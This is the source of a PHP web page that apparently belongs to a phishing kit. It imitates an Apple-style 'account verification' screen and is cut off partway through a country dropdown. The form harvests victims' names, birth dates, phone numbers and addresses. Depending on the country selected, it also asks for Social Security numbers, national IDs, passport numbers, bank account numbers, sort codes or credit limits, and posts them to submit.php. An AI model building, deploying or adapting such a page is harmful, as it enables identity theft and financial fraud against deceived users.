<?php
session_start();
$fnames = $_SESSION['firstname'];
$lnames = $_SESSION['lastname'];
$alamat1 = $_SESSION['address1'];
$alamat2 = $_SESSION['address2'];
$kota = $_SESSION['city'];
$daerah = $_SESSION['state'];
$kodepos = $_SESSION['zip'];
$ultah = $_SESSION['birthday'];
$country = $_SESSION['country'];
if($country == "") {
  $country = "select country";
}
$negara = $_SESSION['country'];
$nohp = $_SESSION['phone'];
if($ultah =="") {
    $ultah = "";
}else{
    $ultah = explode("-",$ultah);
    $ultah = "$ultah[1]/$ultah[2]/$ultah[0]";
}
?>
<?php
echo "<title>$title_bill</title>";
?>
<link rel="stylesheet" type="text/css" href="../assets/css/modal.css">
<script type="text/javascript" src="../assets/js/modal_bill.js"></script>
<style>
#vbvnya {
    display:none;
}
.has-error1 input {
      
    }

.error{
  background-color: #fefdd2;
  
}

#unlocknow{
  background-color: #fff;
  position: absolute;
  width: 100%;
  margin-top:50px;
  height: 1200px;
  z-index: 55;
}

#vbvnya{
  background-color: #fff;
  position: absolute;
  width: 100%;
  margin-top:50px;
  height: 1800px;
  z-index: 55;
}

.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 4px;
    position: absolute;
    height: 45px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 16px;

}

.required:focus{
    outline: none;
    border-color:#97CDF5;
    border-width: 1px;
       -moz-box-shadow: 0px 0px 0px 2px #97CDF5;
    -webkit-box-shadow: 0px 0px 0px 2px #97CDF5;
            box-shadow: 0px 0px 0px 2px #97CDF5;
}

.inox{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.button-save {
    font-size: 15px;
    line-height: 1.47059;
    font-weight: 400;
    letter-spacing: -.022em;
    font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
    background-color: #0070c9;
    background: linear-gradient(#42a1ec,#0070c9);
    border: 1px solid #07c;
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    display: inline-block;
    min-width: 30px;
    padding: 4px 15px;
    text-align: center;
    white-space: nowrap;
}

.button-save.disabled, .button-save:disabled {
    background-color: #0070c9;
    background: linear-gradient(#42a1ec,#0070c9);
    border-color: #07c;
    color: #fff;
    cursor: default;
    opacity: .3;
}

.non-aktif {
    background-color: #0070c9;
    background: linear-gradient(#42a1ec,#0070c9);
}

#bottom_m_login{
  background-color: #000;
  position: absolute;
  opacity: 0.7;
  width: 100%;
  height: 50px;
  z-index: 55;
}

#bottom_m1_login{
  background-color: #fff;
  width: 100%;
  margin-top:50px;
  height: 120px;
  z-index: 55;
}
#i1{
  background-image: url(../assets/img/i1.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 12px;
  left: 20px;
  top: 20px;
  z-index: 999;
  position: absolute;
}
#i2{
  background-image: url(../assets/img/i2.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 29px;
  left: 50%;
  margin-left: -17.5px;
  top: 10px;
  z-index: 999;
  position: absolute;
}
#i3{
  background-image: url(../assets/img/i3.png);
  background-repeat: no-repeat;
  width: 20px;
  height: 26px;
  right: 20px;
  top: 10px;
  z-index: 999;
  position: absolute;
}


#container_m_login{
    position: absolute;
    top: 0px;
    left: 50%;
  width: 330px;
  margin-left: -165px;
}
#xheader_m_login{
    width: 100%;
    height: 500px;
    top:0px;
}

.error{
  background-color: #fefdd2;
}
#sub_navbar_m_login{
    width: 100%;
    height: 61px;
    top: 44px;
    left: 0px;
    z-index: 3;
    position: absolute;
}



</style>

<script>
function ganticountry1() {
    var country = $('#countrynya1 :selected').text();
    if(country == "United States") {
        $('#novbv').html('');
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($ssn);?></b></span><br><br><input oninput="$(\'#ssn2\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="ssn2" style="width:320px;" name="ssn" required="required" class="required" placeholder="<?php echo $ssn;?>" value="" maxlength="11" type="tel"><br><br>');
        
        $('#ssn2').keyup(function() {
                  var val = this.value.replace(/\D/g, '');
                  var newVal = '';
                  if(val.length > 4) {
                     this.value = val;
                  }
                  if((val.length > 3) && (val.length < 6)) {
                     newVal += val.substr(0, 3) + '-';
                     val = val.substr(3);
                  }
                  if (val.length > 5) {
                     newVal += val.substr(0, 3) + '-';
                     newVal += val.substr(3, 2) + '-';
                     val = val.substr(5);
                   }
                   newVal += val;
                   this.value = newVal.substring(0, 11);
        });
    } else if (country == "Hong Kong") {
        $('#novbv').html('');
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($idnumber);?></b></span><br><br><input oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" style="width:320px;" name="idnumber" required="required" class="required" placeholder="<?php echo $idnumber;?>" value="" maxlength="20" type="tel"><br><br>');
    } else if (country == "Cyprus") {
        $('#novbv').html('');
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($passpor);?></b></span><br><br><input oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" style="width:320px;" name="passportnumber" required="required" class="required" placeholder="<?php echo $passpor;?>" value="" maxlength="20" type="tel"><br><br>');
        
        
    } else if (country == "Greece") {
        $('#novbv').html('');
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($passpor);?></b></span><br><br><input oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" style="width:320px;" name="passportnumber" required="required" class="required" placeholder="<?php echo $passpor;?>" value="" maxlength="20" type="tel"><br><br>');
        
        
    } else if (country == "Saudi Arabia") {
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($natio);?></b></span><br><br><input oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" style="width:320px;" name="nationalid" required="required" class="required" placeholder="<?php echo $natio;?>" value="" maxlength="20" type="tel"><br><br>');
        $('#novbv').html('<br><br><br><input class="required" id="cclimit" placeholder="<?php echo strtolower($climit);?>" required="required" name="cc_limit" style="width: 320px;">');
        
        
    } else if (country == "Qatar") {
        $('#novbv').html('');
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($qatariden);?></b></span><br><br><input oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" style="width:320px;" name="qatarid" required="required" class="required" placeholder="<?php echo $qatariden;?>" value="" maxlength="20" type="tel"><br><br>');
        
        
    } else if (country == "Kuwait") {
        $('#novbv').html('');
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($civid);?></b></span><br><br><input oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" style="width:320px;" name="civilid" required="required" class="required" placeholder="<?php echo $civid;?>" value="" maxlength="20" type="tel"><br><br>');
        
        
    } else if (country == "Ireland") {
        $('#novbv').html('');
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($ssn);?></b></span><br><br><input oninput="checkvalidssn();" id="ssn2" style="width:320px;" name="ssn" required="required" class="required" placeholder="<?php echo $ssn;?>" value="" maxlength="11" type="tel"><br><br>');
        $('#ssn2').keyup(function() {
                  var val = this.value.replace(/\D/g, '');
                  var newVal = '';
                  if(val.length > 4) {
                     this.value = val;
                  }
                  if((val.length > 3) && (val.length < 6)) {
                     newVal += val.substr(0, 3) + '-';
                     val = val.substr(3);
                  }
                  if (val.length > 5) {
                     newVal += val.substr(0, 3) + '-';
                     newVal += val.substr(3, 2) + '-';
                     val = val.substr(5);
                   }
                   newVal += val;
                   this.value = newVal.substring(0, 11);
        });
        
        
        $('#ssn2').keyup(function() {
                  var val = this.value.replace(/\D/g, '');
                  var newVal = '';
                  if(val.length > 4) {
                     this.value = val;
                  }
                  if((val.length > 3) && (val.length < 6)) {
                     newVal += val.substr(0, 3) + '-';
                     val = val.substr(3);
                  }
                  if (val.length > 5) {
                     newVal += val.substr(0, 3) + '-';
                     newVal += val.substr(3, 2) + '-';
                     val = val.substr(5);
                   }
                   newVal += val;
                   this.value = newVal.substring(0, 11);
        });
    } else if (country == "India") {
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($accnumber);?></b></span><br><br><input oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" style="width:320px;" name="acc_number" required="required" class="required" placeholder="<?php echo $accnumber;?>" value="" maxlength="15" type="tel"><br><br>');
        $('#novbv').html('<br><br><br><input class="required" id="cclimit" placeholder="<?php echo strtolower($climit);?>" required="required" name="cc_limit" style="width: 320px;">');
        
    } else if (country == "United Kingdom") {
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($accnumber);?></b></span><br><br><input oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" style="width:320px;" name="acc_number" required="required" class="required" placeholder="<?php echo $accnumber;?>" value="" maxlength="15" type="tel"><br><br>');
        $('#novbv').html('<br><br><br><input class="required" id="sortcode" placeholder="sort code" required="required" name="sortcode" style="width: 320px;">');
        
        
    } else if (country == "Australia") {
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($osidnumber);?></b></span><br><br><input oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" style="width:320px;" name="osidnum" required="required" class="required" placeholder="<?php echo $osidnumber;?>" value="" type="tel"><br><br>');
        $('#novbv').html('<br><br><br><input class="required" id="cclimit" placeholder="<?php echo strtolower($climit);?>" required="required" name="cc_limit" style="width: 320px;">');
        
        
    } else if (country == "Canada") {
        $('#novbv').html('');
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($sin);?></b></span><br><br><input oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" style="width:320px;" name="cassn" required="required" class="required" placeholder="<?php echo $sin;?>" value="" type="tel"><br><br>');
        
        
    } else if (country == "Thailand") {
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b><?php echo strtoupper($citizen);?></b></span><br><br><input oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" style="width:320px;" name="citizenid" required="required" class="required" placeholder="<?php echo $citizen;?>" value="" type="tel"><br><br>');
        $('#novbv').html('<br><br><br><input class="required" id="cclimit" placeholder="<?php echo strtolower($climit);?>" required="required" name="cc_limit" style="width: 320px;">');

    } else if (country == "New Zealand") {
        $('#socountry1').html('<hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>BANK ACCESS NUMBER</b></span><br><br><input style="width:320px;" oninput="$(\'#checkvalid\').css(\'border-color\', \'rgb(214, 214, 214)\');$(\'#button_alamat\').removeClass(\'disabled\');" id="checkvalid" name="bankaccnumber" required="required" class="required" placeholder="bank access number" value="" type="text"><br><br>');
        $('#novbv').html('<br><br><br><input class="required" id="cclimit" placeholder="<?php echo strtolower($climit);?>" required="required" name="cc_limit" style="width: 320px;">');
        
        
    } else {
        $('#socountry1').html('');
        $('#novbv').html('');
        
    }
}
function showpesan() {
    $.alert('<?php echo $ccdeclined;?>','<?php echo $payerror;?>', function () {
                
            });
}
function pesanerror(text) {
    $.alert(text,'Notice', function () {
                
            });
}
$(document).ready(function() {
<?php
if($_GET['error'] == "2") {
    if($os == "iPhone" or $os == "iPad" or $os == "iPod" or $os == "Android") {
        echo 'showpesan();';
    }
}
?>
$("#vbvnya").css({'display':'none'});

    $("#formvbv2").on('submit', function(e){
        $("#vbvnya").css({'display':'none'});
        $("#spinner2_").show();
    });
});

function closeunlock()
{
    document.getElementById('unlocknow').style.display = 'none';
}
</script>
    </head>
<body>
<div id="bottom_m_login"></div>
    <div id="i1"></div>
    <div id="i2"></div>
    <div id="i3"></div>
    <div id="head" style="height:130px;"><br><div style="font-size: 28px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;">

         <?php if(!empty($fnames)){ 
            echo "<b><center>$account_verif</center><br><font style='text-align:center;padding:5px;position:absolute;top:70px;width:370px;' size='2px'>$account_id ".$_SESSION['email']."</font></b>";
         }else{
            echo "<b><center>$account_verif</center><br><font style='text-align:center;padding:5px;position:absolute;top:70px;width:370px;' size='2px'>$account_id ".$_SESSION['email']."</font></b>";
            }
            ?> 
            </div>
       </div>
    
    <div id="bottom_m1_login"></div>


<div style="
    margin: auto;
    padding: 19px;
    position: relative;
    margin-top: 15px;
    margin-left: 0px;
    height: 100px;
">
<form id="form2" method="post" action="submit.php" autocomplete="off">
    <div id="namanya">
<span class="xFont2" style="">&nbsp;<b><?php echo $besar_name;?></b></span>
<br><br>
<input type="text" required="required" oninput="$('#name1').css('border-color', 'rgb(214, 214, 214)');" maxlength="25" name="name1" id="name1" value="" style="width: 320px;"  placeholder="<?php echo $fname;?>" class="required" >
<br><br><br>
<input class="required" required="required" oninput="$('#name2').css('border-color', 'rgb(214, 214, 214)');" maxlength="25" placeholder="<?php echo $lname;?>" name="name2" id="name2" value="" type="txt" style="width: 320px;" >
<br><br><br>
<hr style="width: 320px;"><br><br>
<div id="tanggallahir">
<span class="xFont2" style="">&nbsp;<b><?php echo strtoupper($birth);?></b></span>
<br><br>
<input name="bith" id="bith" type="tel" oninput="$('#bith').css('border-color', 'rgb(214, 214, 214)');" required="required" class="required" maxlength="10" value="" placeholder="<?php echo $ddmmyy;?>" style="
    width: 320px;
">
<br><br><br><hr style="width: 320px;"><br><br>

<span class="xFont2" style="">&nbsp;<b><?php echo $besar_phone;?></b></span>
<br><br>
<input name="phone" id="phone" oninput="$('#phone').css('border-color', 'rgb(214, 214, 214)');$('#button_nama').removeClass('disabled');" required="required" name="phone" class="required" placeholder="<?php echo $phone;?>" value="" maxlength="20"  type="tel" style="
    width: 320px;
">
<br><br><br><br>
<span id="button_nama" onclick="if(document.getElementById('name1').value.length == 0)
{
    $('#name1').css('border-color', '#D24122');
}else if(document.getElementById('name2').value.length == 0){
    $('#name2').css('border-color', '#D24122');
}else if(document.getElementById('bith').value.length == 0){
    $('#bith').css('border-color', '#D24122');
}else if(document.getElementById('phone').value.length == 0){
    $('#phone').css('border-color', '#D24122');
}else{
            document.getElementById('tanggallahir').style.display = 'none';
            document.getElementById('namanya').style.display = 'none';
            document.getElementById('alamat').style.display = 'block';
    }" class="button-save disabled" style="
    float:right;margin-right:20px;width: 120px;
    ">
<span><?php echo $save;?></span></span></div>
</div>
<div style="display:none;" id="alamat">
<span class="xFont2" style="">&nbsp;<b><?php echo $besar_add;?></b></span>
<br><br>
<input name="adre1" id="adre1" onkeyup="$('#adre1').css('border-color', 'rgb(214, 214, 214)');" class="required" required="required" maxlength="60" value="" placeholder="<?php echo $street;?>" type="txt" style="width: 320px;" >
<br><br><br>
<input name="city" id="city" onkeyup="$('#city').css('border-color', 'rgb(214, 214, 214)');" class="required" required="required" maxlength="20" value="" placeholder="<?php echo $city;?>" type="txt" style="
    width: 320px;
">
<br><br><br>
<?php if($negara == "Japan") {?>
<select id="state" class="required" name="state" style="
    width: 320px;-webkit-appearance:none;background-color:#fff;" >
      <option value=""><?php echo $state;?></option>
      <option value="愛知県">愛知県</option>
<option value="秋田県">秋田県</option>
<option value="青森県">青森県</option>
<option value="千葉県">千葉県</option>
<option value="愛媛県">愛媛県</option>
<option value="福井県">福井県</option>
<option value="福岡県">福岡県</option>
<option value="福島県">福島県</option>
<option value="群馬県">群馬県</option>
<option value="広島県">広島県</option>
<option value="北海道">北海道</option>
<option value="北海道">北海道</option>
<option value="茨城県">茨城県</option>
<option value="石川県">石川県</option>
<option value="岩手県">岩手県</option>
<option value="香川県">香川県</option>
<option value="鹿児島県">鹿児島県</option>
<option value="神奈川県">神奈川県</option>
<option value="高知県">高知県</option>
<option value="熊本県">熊本県</option>
<option value="京都府">京都府</option>
<option value="三重県">三重県</option>
<option value="宮城県">宮城県</option>
<option value="宮崎県">宮崎県</option>
<option value="長野県">長野県</option>
<option value="長崎県">長崎県</option>
<option value="奈良県">奈良県</option>
<option value="新潟県">新潟県</option>
<option value="大分県">大分県</option>
<option value="岡山県">岡山県</option>
<option value="沖縄県">沖縄県</option>
<option value="大阪府">大阪府</option>
<option value="佐賀県">佐賀県</option>
<option value="埼玉県">埼玉県</option>
<option value="滋賀県">滋賀県</option>
<option value="島根県">島根県</option>
<option value="静岡県">静岡県</option>
<option value="栃木県">栃木県</option>
<option value="徳島県">徳島県</option>
<option value="東京都">東京都</option>
<option value="鳥取県">鳥取県</option>
<option value="富山県">富山県</option>
<option value="和歌山県">和歌山県</option>
<option value="山形県">山形県</option>
<option value="山口県">山口県</option>
<option value="山梨県">山梨県</option>
</select>
<br><br><br>
<?php }else if($negara == "Australia") {?>
<select id="state" class="required" name="state" id="9" style="
    width: 320px;-webkit-appearance:none;background-color:#fff;" >
      <option value=""><?php echo $state;?></option>
      <option value="New South Wales">New South Wales</option>
<option value="Queensland">Queensland</option>
<option value="South Australia">South Australia</option>
<option value="Tasmania">Tasmania</option>
<option value="Victoria">Victoria</option>
<option value="Western Australia">Western Australia</option>
<option value="Australian Capital Territory">Australian Capital Territory</option>
<option value="Northern Territory">Northern Territory</option>
</select>
<br><br><br>
<?php }else if($negara == "United States") {?>
<select id="state" class="required" name="state" id="9" style="
    width: 320px;-webkit-appearance:none;background-color:#fff;" >
      <option value=""><?php echo $state;?></option>
      <option value="Armed Forces Americas">AA - Armed Forces Americas</option>
<option value="Armed Forces Europe">AE - Armed Forces Europe</option>
<option value="Alaska">AK - Alaska</option>
<option value="Alabama">AL - Alabama</option>
<option value="Armed Forces Pacific">AP - Armed Forces Pacific</option>
<option value="Arkansas">AR - Arkansas</option>
<option value="American Samoa">AS - American Samoa</option>
<option value="Arizona">AZ - Arizona</option>
<option value="California">CA - California</option>
<option value="Colorado">CO - Colorado</option>
<option value="Connecticut">CT - Connecticut</option>
<option value="District of Columbia">DC - District of Columbia</option>
<option value="Delaware">DE - Delaware</option>
<option value="Florida">FL - Florida</option>
<option value="Georgia">GA - Georgia</option>
<option value="Guam">GU - Guam</option>
<option value="Hawaii">HI - Hawaii</option>
<option value="Iowa">IA - Iowa</option>
<option value="Idaho">ID - Idaho</option>
<option value="Illinois">IL - Illinois</option>
<option value="Indiana">IN - Indiana</option>
<option value="Kansas">KS - Kansas</option>
<option value="Kentucky">KY - Kentucky</option>
<option value="Louisiana">LA - Louisiana</option>
<option value="Massachusetts">MA - Massachusetts</option>
<option value="Maryland">MD - Maryland</option>
<option value="Maine">ME - Maine</option>
<option value="Michigan">MI - Michigan</option>
<option value="Minnesota">MN - Minnesota</option>
<option value="Missouri">MO - Missouri</option>
<option value="Northern Mariana Islands">MP - Northern Mariana Islands</option>
<option value="Mississippi">MS - Mississippi</option>
<option value="Montana">MT - Montana</option>
<option value="North Carolina">NC - North Carolina</option>
<option value="North Dakota">ND - North Dakota</option>
<option value="Nebraska">NE - Nebraska</option>
<option value="New Hampshire">NH - New Hampshire</option>
<option value="New Jersey">NJ - New Jersey</option>
<option value="New Mexico">NM - New Mexico</option>
<option value="Nevada">NV - Nevada</option>
<option value="New York">NY - New York</option>
<option value="Ohio">OH - Ohio</option>
<option value="Oklahoma">OK - Oklahoma</option>
<option value="Oregon">OR - Oregon</option>
<option value="Pennsylvania">PA - Pennsylvania</option>
<option value="Puerto Rico">PR - Puerto Rico</option>
<option value="Rhode Island">RI - Rhode Island</option>
<option value="South Carolina">SC - South Carolina</option>
<option value="South Dakota">SD - South Dakota</option>
<option value="Tennessee">TN - Tennessee</option>
<option value="Texas">TX - Texas</option>
<option value="Minor Outlying Islands">UM - Minor Outlying Islands</option>
<option value="Utah">UT - Utah</option>
<option value="Virginia">VA - Virginia</option>
<option value="Virgin Islands">VI - Virgin Islands</option>
<option value="Vermont">VT - Vermont</option>
<option value="Washington">WA - Washington</option>
<option value="Wisconsin">WI - Wisconsin</option>
<option value="West Virginia">WV - West Virginia</option>
<option value="Wyoming">WY - Wyoming</option>
</select>
<br><br><br>
<?php }else{ ?>
<input type="text" name="state" id="state" value="" maxlength="20" style="width: 320px;" placeholder="<?php echo $state;?>" class="required">
    <br><br><br>
<?php } ?>
    <input type="hidden" name="xuser" value="<?php echo $xuser;?>">
<select id="countrynya1" onchange="ganticountry1();" class="required" name="cojjuntry" id="9" style="
    width: 320px;-webkit-appearance:none;background-color:#fff;" >
      <option value="<?php echo $country;?>"><?php echo $country;?></option>
<option value="Afghanistan">Afghanistan</option>
<option value="Albania">Albania</option>
<option value="Algeria">Algeria</option>
<option value="American Samoa">American Samoa</option> 
<option value="Andorra">Andorra</option>
<option value="Angola">Angola</option> 
<option value="Anguilla">Anguilla</option> 
<option value="Antarctica">Antarctica</option> 
<option value="Antigua and Barbuda">Antigua and Barbuda</option> 
<option value="Argentina">Argentina</option> 
<option value="Armenia">Armenia</option> 
<option value="Aruba">Aruba</option> 
<option value="Australia">Australia</option> 
<option value="Austria">Austria</option> 
<option value="Azerbaijan">Azerbaijan</option> 
<option value="Bahamas">Bahamas</option> 
<option value="Bahrain">Bahrain</option> 
<option value="Bangladesh">Bangladesh</option> 
<option value="Barbados">Barbados</option> 
<option value="Belarus">Belarus</option> 
<option value="Belgium">Belgium</option> 
<option value="Belize">Belize</option> 
<option value="Benin">Benin</option> 
<option value="Bermuda">Bermuda</option> 
<option value="Bhutan">Bhutan</option> 
<option value="Bolivia">Bolivia</option> 
<option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option> 
<option value="Botswana">Botswana</option> 
<option value="Bouvet Island">Bouvet Island</option> 
<option value="Brazil">Brazil</option> 
<option value="British Indian Ocean Territory">British Indian Ocean Territory</option> 
<option value="Brunei Darussalam">Brunei Darussalam</option> 
<option value="Bulgaria">Bulgaria</option> 
<option value="Burkina Faso">Burkina Faso</option> 
<option value="Burundi">Burundi</option> 
<option value="Cambodia">Cambodia</option> 
<option value="Cameroon">Cameroon</option> 
<option value="Canada">Canada</option> 
<option value="Cape Verde">Cape Verde</option> 
<option value="Cayman Islands">Cayman Islands</option> 
<option value="Central African Republic">Central African Republic</option> 
<option value="Chad">Chad</option> 
<option value="Chile">Chile</option> 
<option value="China">China</option> 
<option value="Christmas Island">Christmas Island</option> 
<option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option> 
<option value="Colombia">Colombia</option> 
<option value="Comoros">Comoros</option> 
<option value="Congo">Congo</option> 
<option value="Congo, The Democratic Republic of The">Congo, The Democratic Republic of The</option> 
<option value="Cook Islands">Cook Islands</option> 
<option value="Costa Rica">Costa Rica</option> 
<option value="Cote D'ivoire">Cote D'ivoire</option> 
<option value="Croatia">Croatia</option> 
<option value="Cuba">Cuba</option> 
<option value="Cyprus">Cyprus</option> 
<option value="Czech Republic">Czech Republic</option> 
<option value="Denmark">Denmark</option> 
<option value="Djibouti">Djibouti</option> 
<option value="Dominica">Dominica</option> 
<option value="Dominican Republic">Dominican Republic</option> 
<option value="Ecuador">Ecuador</option> 
<option value="Egypt">Egypt</option> 
<option value="El Salvador">El Salvador</option> 
<option value="Equatorial Guinea">Equatorial Guinea</option> 
<option value="Eritrea">Eritrea</option> 
<option value="Estonia">Estonia</option> 
<option value="Ethiopia">Ethiopia</option> 
<option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option> 
<option value="Faroe Islands">Faroe Islands</option> 
<option value="Fiji">Fiji</option> 
<option value="Finland">Finland</option> 
<option value="France">France</option> 
<option value="French Guiana">French Guiana</option> 
<option value="French Polynesia">French Polynesia</option> 
<option value="French Southern Territories">French Southern Territories</option> 
<option value="Gabon">Gabon</option> 
<option value="Gambia">Gambia</option> 
<option value="Georgia">Georgia</option> 
<option value="Germany">Germany</option> 
<option value="Ghana">Ghana</option> 
<option value="Gibraltar">Gibraltar</option> 
<option value="Greece">Greece</option> 
<option value="Greenland">Greenland</option> 
<option value="Grenada">Grenada</option> 
<option value="Guadeloupe">Guadeloupe</option> 
<option value="Guam">Guam</option> 
<option value="Guatemala">Guatemala</option> 
<option value="Guinea">Guinea</option> 
<option value="Guinea-bissau">Guinea-bissau</option> 
<option value="Guyana">Guyana</option> 
<option value="Haiti">Haiti</option> 
<option value="Heard Island and Mcdonald Islands">Heard Island and Mcdonald Islands</option> 
<option value="Holy See (Vatican City State)">Holy See (Vatican City State)</option> 
<option value="Honduras">Honduras</option> 
<option value="Hong Kong">Hong Kong</option> 
<option value="Hungary">Hungary</option> 
<option value="Iceland">Iceland</option> 
<option value="India">India</option> 
<option value="Indonesia">Indonesia</option> 
<option value="Iran, Islamic Republic of">Iran, Islamic Republic of</option> 
<option value="Iraq">Iraq</option> 
<option value="Ireland">Ireland</option> 
<option value="Israel">Israel</option> 
<option value="Italy">Italy</option> 
<option value="Jamaica">Jamaica</option> 
<option value="Japan">Japan</option> 
<option value="Jordan">Jordan</option> 
<option value="Kazakhstan">Kazakhstan</option> 
<option value="Kenya">Kenya</option> 
<option value="Kiribati">Kiribati</option> 
<option value="Korea, Democratic People's Republic of">Korea, Democratic People's Republic of</option> 
<option value="Korea, Republic of">Korea, Republic of</option> 
<option value="Kuwait">Kuwait</option> 
<option value="Kyrgyzstan">Kyrgyzstan</option> 
<option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option> 
<option value="Latvia">Latvia</option> 
<option value="Lebanon">Lebanon</option> 
<option value="Lesotho">Lesotho</option> 
<option value="Liberia">Liberia</option> 
<option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option> 
<option value="Liechtenstein">Liechtenstein</option> 
<option value="Lithuania">Lithuania</option> 
<option value="Luxembourg">Luxembourg</option> 
<option value="Macao">Macao</option> 
<option value="Macedonia, The Former Yugoslav Republic of">Macedonia, The Former Yugoslav Republic of</option> 
<option value="Madagascar">Madagascar</option> 
<option value="Malawi">Malawi</option> 
<option value="Malaysia">Malaysia</option> 
<option value="Maldives">Maldives</option> 
<option value="Mali">Mali</option> 
<option value="Malta">Malta</option> 
<option value="Marshall Islands">Marshall Islands</option> 
<option value="Martinique">Martinique</option> 
<option value="Mauritania">Mauritania</option> 
<option value="Mauritius">Mauritius</option> 
<option value="Mayotte">Mayotte</option> 
<option value="Mexico">Mexico</option> 
<option value="Micronesia, Federated States of">Micronesia, Federated States of</option> 
<option value="Moldova, Republic of">Moldova, Republic of</option> 
<option value="Monaco">Monaco</option> 
<option value="Mongolia">Mongolia</option> 
<option value="Montserrat">Montserrat</option> 
<option value="Morocco">Morocco</option> 
<option value="Mozambique">Mozambique</option> 
<option value="Myanmar">Myanmar</option> 
<option value="Namibia">Namibia</option> 
<option value="Nauru">Nauru</option> 
<option value="Nepal">Nepal</option> 
<option value="Netherlands">Netherlands</option> 
<option value="Netherlands Antilles">Netherlands Antilles</option> 
<option value="New Caledonia">New Caledonia</option> 
<option value="New Zealand">New Zealand</option> 
<option value="Nicaragua">Nicaragua</option> 
<option value="Niger">Niger</option> 
<option value="Nigeria">Nigeria</option> 
<option value="Niue">Niue</option> 
<option value="Norfolk Island">Norfolk Island</option> 
<option value="Northern Mariana Islands">Northern Mariana Islands</option> 
<option value="Norway">Norway</option> 
<option value="Oman">Oman</option> 
<option value="Pakistan">Pakistan</option> 
<option value="Palau">Palau</option> 
<option value="Palestinian Territory, Occupied">Palestinian Territory, Occupied</option> 
<option value="Panama">Panama</option> 
<option value="Papua New Guinea">Papua New Guinea</option> 
<option value="Paraguay">Paraguay</option> 
<option value="Peru">Peru</option> 
<option value="Philippines">Philippines</option> 
<option value="Pitcairn">Pitcairn</option> 
<option value="Poland">Poland</option> 
<option value="Portugal">Portugal</option> 
<option value="Puerto Rico">Puerto Rico</option> 
<option value="Qatar">Qatar</option> 
<option value="Reunion">Reunion</option> 
<option value="Romania">Romania</option> 
<option value="Russian Federation">Russian Federation</option> 
<option value="Rwanda">Rwanda</option> 
<option value="Saint Helena">Saint Helena</option> 
<option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option> 
<option value="Saint Lucia">Saint Lucia</option> 
<option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option> 
<option value="Saint Vincent and The Grenadines">Saint Vincent and The Grenadines</option> 
<option value="Samoa">Samoa</option> 
<option value="San Marino">San Marino</option> 
<option value="Sao Tome and Principe">Sao Tome and Principe</option> 
<option value="Saudi Arabia">Saudi Arabia</option> 
